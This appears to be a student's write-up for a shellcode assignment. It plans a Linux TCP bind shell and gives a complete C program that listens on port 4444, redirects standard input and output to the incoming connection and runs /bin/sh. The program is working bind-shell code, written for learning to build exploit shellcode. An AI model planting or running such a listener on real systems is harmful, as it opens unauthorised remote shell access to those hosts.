<div id="table-of-contents">
<h2>Table of Contents</h2>
<div id="text-table-of-contents">
<ul>
<li><a href="#sec-1">1. Assignment 1</a>
<ul>
<li><a href="#sec-1-1">1.1. Requirements</a></li>
<li><a href="#sec-1-2">1.2. Strategy</a></li>
<li><a href="#sec-1-3">1.3. The C program</a></li>
</ul>
</li>
</ul>
</div>
</div>

# Assignment 1<a id="sec-1" name="sec-1"></a>

## Requirements<a id="sec-1-1" name="sec-1-1"></a>

-   Create a Shell<sub>Bind</sub><sub>TCP</sub> shellcode
    -   Bind to a port
    -   Execs Shell on incoming connection
-   Port number should be easily configurable

## Strategy<a id="sec-1-2" name="sec-1-2"></a>

My approach to building a tcp bind shell shellcode will be to:

-   Create a C program which illustrates the basic functionality
-   Analyze the C program system calls to see how the program interacts with the kernel to accomplish its tasks
-   Lookup the system calls and see what arguments and structures they take
-   Attempt to write some assembly that calls the same system calls in the same order with the same arguments as the C program does
-   Debug issues as of course there will be :)

## The C program<a id="sec-1-3" name="sec-1-3"></a>

From my experience playing around with socket programming in C and
Python, there is a basic formula and group of function calls for
creating clients and servers. Most of them will be useful to us. A
couple won't be applicable to our situation.  The functions we will
find useful are:

-   Socket: Open a socket over which we will communicate. Essentially a file descriptor
-   Bind: Bind our socket to an interface on our system
-   Listen: Tell our system that we are ready to start accepting connections
-   Accept: Accept the connection. This is a necessary next step as listen will generally queue up connections in anticipation of them being accepted

Functions we won't worry about:

-   Send
-   Recv
-   Connect
-   Close

We won't worry about send or recv because they are used for managing
the flow of data coming in and out and acting accordingly.  We are
instead going to just redirect stdin, stdout, and stderr over the
socket using a function called dup2 and not worry about managing the
flow of data. Since we aren't connecting to another system/server we
don't need to worry about connect. And as for close, it is generally
good practice to close files after your done with them but one leaked
file descriptor won't hurt anyone right? We need to trim the fat!

So lets get some code going!

    #include <stdio.h>
    #include <netinet/in.h>
    #define PORT 4444
    
    int main(int argc, char **argv)
    {
      // Create a socket
      int lsock = socket(AF_INET, SOCK_STREAM, 0);
    
      // Setup servr side config struct
      // We configure:
      // The family:IPv4
      // The interface: 0.0.0.0 (any)
      // The port: port#
      struct sockaddr_in config;
      config.sin_family = AF_INET;
      config.sin_addr.s_addr = INADDR_ANY;
      config.sin_port = htons(PORT);
    
      // Bind the created socket with the interface
      // specified in the configuration
      bind(lsock, (struct sockaddr *)&config, sizeof(config));
    
      // Listen on the socket
      listen(lsock, 0);
    
      // Accept the incoming connection
      int csock = accept(lsock, NULL, NULL);
      // Redirect stdin, stdout, and stderror
      dup2(csock, 0);
      dup2(csock, 1);
      dup2(csock, 2);
    
      // Execute a shell
      execve("/bin/sh", NULL, NULL);
    };
